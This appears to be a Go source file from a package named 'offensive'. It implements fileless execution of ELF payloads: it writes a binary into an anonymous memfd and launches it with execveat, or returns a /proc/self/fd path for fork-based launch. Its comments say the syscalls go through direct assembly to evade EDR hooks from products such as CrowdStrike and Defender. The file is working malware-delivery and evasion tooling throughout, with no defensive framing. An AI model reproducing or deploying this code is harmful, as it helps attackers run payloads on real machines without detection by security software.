package offensive

import (
	"fmt"
	"runtime"
	"syscall"
)

const (
	mfdCloexec      = 0x0001 // MFD_CLOEXEC
	mfdAllowSealing = 0x0002 // MFD_ALLOW_SEALING
	atEmptyPath     = 0x1000 // AT_EMPTY_PATH for execveat
)

// ShadowExec executes an ELF binary entirely from RAM without touching disk.
// Flow: memfd_create → write(ELF) → execveat(fd, AT_EMPTY_PATH)
// All critical syscalls go through Go Assembly (direct SYSCALL instruction)
// to bypass user-space inline hooks from EDR (CrowdStrike, Defender, etc).
//
// WARNING: execveat replaces the current process image. For non-destructive
// usage, the caller must fork first. Designed for single-shot delivery
// inside an already-sandboxed namespace.
func ShadowExec(elfPayload []byte, argv []string, envp []string) error {
	if len(elfPayload) < 4 {
		return fmt.Errorf("payload too small to be valid ELF")
	}
	if elfPayload[0] != 0x7f || elfPayload[1] != 'E' || elfPayload[2] != 'L' || elfPayload[3] != 'F' {
		return fmt.Errorf("invalid ELF magic header")
	}

	runtime.LockOSThread()

	// Step 1: memfd_create via direct ASM
	emptyName := [1]byte{0}
	fd, errno := sysMemfdCreate(&emptyName[0], mfdCloexec|mfdAllowSealing)
	if errno != 0 {
		runtime.UnlockOSThread()
		return fmt.Errorf("memfd_create failed: errno %d", errno)
	}

	// Step 2: Write ELF payload into memfd via direct ASM
	written := uintptr(0)
	for written < uintptr(len(elfPayload)) {
		remaining := uintptr(len(elfPayload)) - written
		n, wErrno := sysWrite(fd, &elfPayload[written], remaining)
		if wErrno != 0 {
			runtime.UnlockOSThread()
			return fmt.Errorf("write to memfd failed at offset %d: errno %d", written, wErrno)
		}
		written += n
	}

	// Step 3: C-style argv/envp
	cArgv := toCStringArray(argv)
	cEnvp := toCStringArray(envp)

	var argvPtr, envpPtr **byte
	if len(cArgv) > 0 {
		argvPtr = &cArgv[0]
	}
	if len(cEnvp) > 0 {
		envpPtr = &cEnvp[0]
	}

	// Step 4: execveat — replaces process image. Only returns on error.
	errno = sysExecveAt(fd, &emptyName[0], argvPtr, envpPtr, atEmptyPath)
	runtime.UnlockOSThread()
	return fmt.Errorf("execveat failed: errno %d", errno)
}

// toCStringArray converts Go strings to null-terminated C string pointer array.
func toCStringArray(strs []string) []*byte {
	ptrs := make([]*byte, len(strs)+1)
	for i, s := range strs {
		b := make([]byte, len(s)+1)
		copy(b, s)
		ptrs[i] = &b[0]
	}
	ptrs[len(strs)] = nil
	return ptrs
}

// ShadowLoad writes an ELF to a memfd and returns /proc/self/fd/N
// for fork-based execution (non-destructive).
func ShadowLoad(elfPayload []byte) (fdPath string, cleanup func(), err error) {
	if len(elfPayload) < 4 || elfPayload[0] != 0x7f {
		return "", nil, fmt.Errorf("invalid ELF payload")
	}

	emptyName := [1]byte{0}
	fd, errno := sysMemfdCreate(&emptyName[0], mfdCloexec|mfdAllowSealing)
	if errno != 0 {
		return "", nil, fmt.Errorf("memfd_create failed: errno %d", errno)
	}

	written := uintptr(0)
	for written < uintptr(len(elfPayload)) {
		remaining := uintptr(len(elfPayload)) - written
		n, wErrno := sysWrite(fd, &elfPayload[written], remaining)
		if wErrno != 0 {
			return "", nil, fmt.Errorf("write failed: errno %d", wErrno)
		}
		written += n
	}

	path := fmt.Sprintf("/proc/self/fd/%d", fd)
	closeFn := func() {
		syscall.Close(int(fd))
	}
	return path, closeFn, nil
}
